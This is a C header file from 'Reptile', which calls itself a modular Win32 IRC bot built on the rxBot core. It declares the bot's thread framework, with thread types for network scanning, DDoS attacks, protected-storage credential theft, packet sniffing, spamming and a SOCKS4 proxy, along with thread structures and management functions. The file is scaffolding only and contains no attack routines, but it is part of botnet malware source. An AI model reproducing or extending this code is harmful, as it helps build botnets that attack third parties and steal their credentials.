/*

    Reptile - a modular IRC bot for Win32
    Based on the rxBot core by Racerx90

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

enum {
	MAIN_THREAD,
	PROC_THREAD,
	SECURE_THREAD,
	ASECURE_THREAD,
	LIST_THREAD,
	RUPTIME_THREAD,
	SCAN_THREAD,
	DDOS_THREAD,
	VISIT_THREAD,
	DOWNLOAD_THREAD,
	PSTORE_THREAD,
	SNIFFER_THREAD,
	SPAMBOT_THREAD,
	SOCK4_THREAD,
};

typedef struct THREAD 
{
   char name[IRCLINE];
   int id; 
   int parent;
   DWORD pid;
   HANDLE tHandle;
   SOCKET csock;

} THREAD;

// default new thread structure
typedef struct NTHREAD {
	void *conn;
	char target[128];
	int  threadnum;
	
	char *data1;
	char *data2;
	char *data3;

	BOOL bdata1;
	BOOL bdata2;
	BOOL bdata3;

	int idata1;
	int idata2;
	int idata3;

	SOCKET sock;
	SOCKET csock;

	BOOL verbose;
	BOOL silent;
	BOOL gotinfo;

} NTHREAD;


int addthread(int id, char *name,...);
BOOL killthread(int threadnum);
int killthreadall(void);
int killthreadid(int threadid, int threadnum=0);
void clearthread(int threadnum);
DWORD WINAPI ListThread(LPVOID param);
void stopthread(char *target, void* conn, BOOL silent, BOOL verbose, char *thread, int threadid, char *desc);
int findthreadid(int threadid);
int findthreadnum(int threadid);
